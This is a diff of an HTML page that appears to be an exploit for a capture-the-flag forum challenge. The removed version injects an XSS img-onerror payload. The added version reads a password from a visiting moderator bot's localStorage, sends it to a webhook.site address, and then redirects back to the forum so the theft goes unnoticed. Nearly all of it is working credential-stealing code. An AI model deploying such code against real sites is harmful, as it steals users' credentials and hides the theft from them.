@@ -1,18 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-        // Redirect to the system announcement with XSS payload
-        const xssPayload = encodeURIComponent(`<img src=x
-onerror="fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?p='+localStorage.getItem('password'));
-fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652');">`)
-
-        // Construct the URL to the system announcement with our payload
-        // We're using the hash navigation to trigger the announcement view with our payload
-        window.location = `http://forum2.gliactf.eu/#/announcement/1${xssPayload}`;
-    </script>
-</body>
-</html>
+<!DOCTYPE html>                                                                                                             
+<html>                                                                                                                      
+<head>                                                                                                                      
+    <title>Forum Content</title>                                                                                            
+</head>                                                                                                                     
+<body>                                                                                                                      
+    <script>                                                                                                                
+        // The moderator bot is already logged in when it visits this page                                                  
+        // We just need to steal the password from localStorage                                                             
+                                                                                                                            
+        // Get the password                                                                                                 
+        const password = localStorage.getItem('password');                                                                  
+                                                                                                                            
+        // Send it to our webhook                                                                                           
+        if (password) {                                                                                                     
+            fetch('https://webhook.site/5283714c-0d6d-40d5-8473-70415e0e5652?password=' + encodeURIComponent(password))     
+                .then(() => {                                                                                               
+                    // After sending the password, redirect back to the forum                                               
+                    // to avoid suspicion                                                                                   
+                    window.location = 'http://forum2.gliactf.eu/';                                                          
+                });                                                                                                         
+        }                                                                                                                   
+    </script>                                                                                                               
+</body>                                                                                                                     
+</html>  
